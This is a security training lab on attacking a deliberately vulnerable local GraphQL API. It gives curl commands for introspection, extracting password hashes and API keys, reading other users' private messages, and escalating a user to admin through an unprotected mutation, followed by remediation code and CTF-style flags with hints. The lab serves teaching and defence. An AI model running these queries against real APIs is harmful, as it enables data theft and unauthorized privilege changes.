# Lab: GraphQL Attacks — Introspection, Data Extraction & Privilege Escalation

## Objective

Discover and exploit vulnerabilities in the SocialHack API's GraphQL endpoint. You will use introspection to map the entire schema, extract sensitive data (password hashes, API keys, internal notes), read private content, and escalate privileges via unprotected mutations.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Hard |
| **Estimated Time** | 60 minutes |
| **Prerequisites** | Labs 01–08 completed, basic GraphQL knowledge, Python 3 with `requests` |
| **OWASP API Category** | API3:2023 – Broken Object Property Level Authorization / API5:2023 – Broken Function Level Authorization |

---

## Background

### What Is GraphQL?

GraphQL is a query language for APIs that allows clients to request exactly the data they need. Unlike REST (which has fixed endpoints), GraphQL uses a **single endpoint** and lets clients define the shape of the response.

### GraphQL vs REST

| Feature | REST | GraphQL |
|---|---|---|
| Endpoints | Multiple (`/users`, `/posts`) | Single (`/graphql`) |
| Data fetching | Server decides what to return | Client decides what to request |
| Over-fetching | Common (returns all fields) | Eliminated (request specific fields) |
| Schema | Implicit | Explicit, queryable |
| Introspection | No built-in equivalent | Built-in `__schema` queries |

### GraphQL Query Structure

```graphql
# Query — read data
query {
  users {
    id
    username
    email
  }
}

# Mutation — modify data
mutation {
  updateUserRole(user_id: 1, role: "admin") {
    id
    username
    role
  }
}

# Introspection — discover schema
query {
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

### Common GraphQL Vulnerabilities

| Vulnerability | Description |
|---|---|
| **Introspection enabled** | Exposes entire API schema to attackers |
| **Excessive data exposure** | Sensitive fields (password_hash, api_key) in schema |
| **Missing authorization** | Queries/mutations accessible without proper auth |
| **IDOR via GraphQL** | Querying other users' data by changing IDs |
| **Batching attacks** | Multiple operations in one request |
| **Nested query DoS** | Deeply nested queries cause performance issues |

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5001` |
| GraphQL Endpoint | `POST /api/v1/graphql` (also `GET`) |
| Introspection | Enabled |
| Sensitive Fields | `password_hash`, `api_key`, `internal_notes` |
| Unprotected Mutations | `updateUserRole`, `deleteUser` |

---

## Tasks

### Task 1: Discover the GraphQL Endpoint

**Goal:** Locate the GraphQL endpoint and verify it's functional.

**Steps:**

1. Login and save the token:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

2. Test the GraphQL endpoint with a simple query:

```bash
# POST method (standard)
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __typename }"}'
```

3. Test with GET method:

```bash
curl -s "http://localhost:5001/api/v1/graphql?query=\{__typename\}" \
  -H "Authorization: Bearer $TOKEN"
```

4. Verify the endpoint works by requesting basic data:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id username } }"}'
```

<details>
<summary>Hint 1</summary>
GraphQL typically responds with <code>{"data": {...}}</code> for successful queries and <code>{"errors": [...]}</code> for failures.
</details>

<details>
<summary>Hint 2</summary>
The <code>__typename</code> query is the simplest test — it returns the root query type name. If this works, the endpoint is functional.
</details>

<details>
<summary>Hint 3</summary>
Both GET and POST should work. POST is standard for mutations and complex queries. GET works for simple queries via URL parameters.
</details>

---

### Task 2: Run Introspection to Map the Schema

**Goal:** Use GraphQL's built-in introspection to discover the complete API schema, including all types, fields, and mutations.

**Steps:**

1. Run a basic introspection query:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}' | python3 -m json.tool
```

2. Get query and mutation types specifically:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { queryType { name fields { name args { name type { name } } } } mutationType { name fields { name args { name type { name } } } } } }"}'
```

3. Examine a specific type to see its fields:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}'
```

4. Look for sensitive field names in the schema: `password_hash`, `api_key`, `internal_notes`, `secret`, etc.

> **🚩 FLAG 1:** How many types are defined in the schema?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
The introspection query returns a <code>types</code> array in <code>__schema</code>. Count the entries. Note that this includes built-in GraphQL types like <code>String</code>, <code>Int</code>, <code>Boolean</code>, etc.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
Use Python to count: <code>len(data["data"]["__schema"]["types"])</code>. Filter out types starting with <code>__</code> (internal GraphQL types) for custom types only.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
Count all types from the introspection response. Custom types include: <code>User</code>, <code>Post</code>, <code>Message</code>, <code>Query</code>, <code>Mutation</code>, plus scalar types. The total count depends on the schema implementation.
</details>

---

### Task 3: Extract Users with Sensitive Data

**Goal:** Query for all users including sensitive fields that should not be exposed (password hashes, API keys, internal notes).

**Steps:**

1. Query all users with sensitive fields:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id username email password_hash api_key internal_notes role is_verified } }"}' | python3 -m json.tool
```

2. If the above returns errors for some fields, try each sensitive field individually:

```bash
# password_hash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id username password_hash } }"}'

# api_key
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id username api_key } }"}'

# internal_notes
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id username internal_notes } }"}'
```

3. Identify the admin user and extract their API key.

> **🚩 FLAG 2:** What is the admin's `api_key` extracted via GraphQL?

<details>
<summary>Hint 1</summary>
The admin user has id=4. Look for the <code>api_key</code> field in the introspection results first to confirm it exists, then query it directly.
</details>

<details>
<summary>Hint 2</summary>
Try: <code>{"query":"{ users { id username api_key } }"}</code>. The admin's api_key will be a long alphanumeric string — this is a critical finding as it could grant API access.
</details>

<details>
<summary>Hint 3</summary>
The admin's api_key will be in the response. Common formats: UUID, hex string, or custom token. Look for the user with role "admin" in the results.
</details>

---

### Task 4: Read Private Posts

**Goal:** Use GraphQL to access posts that are marked as private or not public.

**Steps:**

1. Query all posts including the `is_public` field:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ posts { id title content author is_public created_at } }"}' | python3 -m json.tool
```

2. Look for posts where `is_public` is `false` — these should not be visible to regular users.

3. Try to read a specific user's posts:

```bash
# If the schema supports filtering
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ posts { id title content author is_public } }"}'
```

4. Note any sensitive content in private posts (passwords, internal info, etc.).

<details>
<summary>Hint 1</summary>
GraphQL returns all data the schema allows — if <code>is_public</code> is a field but the resolver doesn't filter by it, you'll see both public and private posts.
</details>

<details>
<summary>Hint 2</summary>
Check the <code>author</code> field to see who created private posts. Admin or private users (like charlie) might have sensitive private posts.
</details>

<details>
<summary>Hint 3</summary>
The GraphQL endpoint likely returns ALL posts regardless of <code>is_public</code> status because there's no authorization check on the resolver. This is a Broken Object Property Level Authorization vulnerability.
</details>

---

### Task 5: Read Private Messages

**Goal:** Access other users' private messages through GraphQL.

**Steps:**

1. Query messages for the admin user (id=4):

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ messages(user_id: 4) { id content sender recipient created_at } }"}' | python3 -m json.tool
```

2. Try querying messages for all users:

```bash
# Messages for user 1 (alice)
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ messages(user_id: 1) { id content sender recipient } }"}'

# Messages for user 2 (bob)
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ messages(user_id: 2) { id content sender recipient } }"}'

# Messages for user 3 (charlie - private account)
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ messages(user_id: 3) { id content sender recipient } }"}'
```

3. Look for sensitive information in messages (passwords, tokens, internal communications).

<details>
<summary>Hint 1</summary>
The <code>messages</code> query takes a <code>user_id</code> argument. Since alice is authenticated, she should only see her own messages — but does the API enforce this?
</details>

<details>
<summary>Hint 2</summary>
Try different <code>user_id</code> values. If you can read other users' messages, it's a BOLA (Broken Object Level Authorization) vulnerability exposed through GraphQL.
</details>

<details>
<summary>Hint 3</summary>
The GraphQL resolver likely doesn't check if the requesting user owns the messages. Any authenticated user can read any user's messages by changing the <code>user_id</code> parameter.
</details>

---

### Task 6: Privilege Escalation via Mutation

**Goal:** Use an unprotected GraphQL mutation to escalate alice's role from "user" to "admin".

**Steps:**

1. First, check alice's current role:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id username role } }"}'
```

2. Discover available mutations via introspection:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'
```

3. Execute the `updateUserRole` mutation to make alice an admin:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { updateUserRole(user_id: 1, role: \"admin\") { id username role } }"}'
```

4. Verify the escalation worked:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id username role } }"}'
```

5. With admin role, try accessing admin-only endpoints:

```bash
curl -s http://localhost:5001/api/v1/admin/stats \
  -H "Authorization: Bearer $TOKEN"
```

> **🚩 FLAG 3:** Successfully change alice's role to admin via the `updateUserRole` mutation.

<details>
<summary>Hint 1</summary>
Mutations in GraphQL are like POST/PUT requests in REST — they modify data. The <code>updateUserRole</code> mutation takes <code>user_id</code> and <code>role</code> parameters.
</details>

<details>
<summary>Hint 2</summary>
The mutation syntax wraps the operation in <code>mutation { ... }</code> instead of <code>query { ... }</code>. Make sure to use the correct syntax: <code>mutation { updateUserRole(user_id: 1, role: "admin") { id username role } }</code>
</details>

<details>
<summary>Hint 3</summary>
If the mutation succeeds, alice (user_id: 1) will have her role changed from "user" to "admin". The response should show the updated user object with <code>"role": "admin"</code>.
</details>

---

### Task 7: Delete a User via Mutation (Careful!)

**Goal:** Test the `deleteUser` mutation — only use a non-existent or test user ID.

**Steps:**

1. First, check if the `deleteUser` mutation exists:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { mutationType { fields { name } } } }"}'
```

2. Test with a non-existent user ID (99) to avoid damaging the lab:

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { deleteUser(user_id: 99) }"}'
```

3. Note the response — does it succeed, fail, or error? A successful response to deleting any user ID (even non-existent) indicates the mutation lacks authorization checks.

> ⚠️ **WARNING:** Do NOT delete users with IDs 1-5 as this will break other lab exercises. Only use ID 99 or higher.

<details>
<summary>Hint 1</summary>
The <code>deleteUser</code> mutation is extremely dangerous because it has no authorization check. Any authenticated user can delete any other user.
</details>

<details>
<summary>Hint 2</summary>
The mutation returns a simple success/failure indicator. If it doesn't check authorization, even alice (a regular user) can delete users — including the admin.
</details>

<details>
<summary>Hint 3</summary>
Use <code>mutation { deleteUser(user_id: 99) }</code> to safely test. If the API returns a success response or "user not found" (instead of "unauthorized"), the mutation lacks access control.
</details>

---

## Flags Summary

| Flag | Description | Expected Value |
|---|---|---|
| FLAG 1 | Number of types in the schema | Count from introspection response |
| FLAG 2 | Admin's api_key via GraphQL | Check GraphQL response |
| FLAG 3 | Alice's role changed to admin | `mutation { updateUserRole(...) }` succeeds |

---

## Remediation

### 1. Disable Introspection in Production

```python
# Using Ariadne
from ariadne import make_executable_schema
from ariadne.validation import IntrospectionDisabledRule

app = GraphQL(
    schema,
    validation_rules=[IntrospectionDisabledRule]
)
```

```python
# Using Graphene
class NoIntrospectionMiddleware:
    def resolve(self, next, root, info, **args):
        if info.field_name.startswith("__"):
            return None
        return next(root, info, **args)
```

### 2. Remove Sensitive Fields from Schema

```python
class UserType(graphene.ObjectType):
    id = graphene.Int()
    username = graphene.String()
    email = graphene.String()
    role = graphene.String()
    # DO NOT expose:
    # password_hash = graphene.String()
    # api_key = graphene.String()
    # internal_notes = graphene.String()
```

### 3. Implement Authorization on Resolvers

```python
def resolve_messages(self, info, user_id):
    current_user = get_current_user(info.context)

    # Only allow users to see their own messages
    if current_user.id != user_id and current_user.role != "admin":
        raise GraphQLError("Unauthorized: Cannot access other users' messages")

    return Message.query.filter_by(user_id=user_id).all()
```

### 4. Protect Mutations with Role-Based Access

```python
def resolve_update_user_role(self, info, user_id, role):
    current_user = get_current_user(info.context)

    # Only admins can change roles
    if current_user.role != "admin":
        raise GraphQLError("Unauthorized: Admin role required")

    # Prevent self-demotion
    if current_user.id == user_id:
        raise GraphQLError("Cannot modify your own role")

    user = User.query.get(user_id)
    user.role = role
    db.session.commit()
    return user
```

### 5. Implement Query Depth Limiting

```python
from graphql import parse
from graphql.validation import validate

MAX_DEPTH = 5

def check_query_depth(query_string):
    ast = parse(query_string)
    depth = calculate_depth(ast)
    if depth > MAX_DEPTH:
        raise GraphQLError(f"Query depth {depth} exceeds maximum {MAX_DEPTH}")
```

### 6. Rate Limit GraphQL Queries

```python
from flask_limiter import Limiter

@app.route("/api/v1/graphql", methods=["POST"])
@limiter.limit("30 per minute")
def graphql_endpoint():
    # ... process query
```

---

## References

- [OWASP GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [PortSwigger — GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
- [HackTricks — GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [PayloadsAllTheThings — GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
- [GraphQL Voyager — Schema Visualization](https://ivangoncharov.github.io/graphql-voyager/)
- [InQL — Burp Suite GraphQL Extension](https://github.com/doyensec/inern)
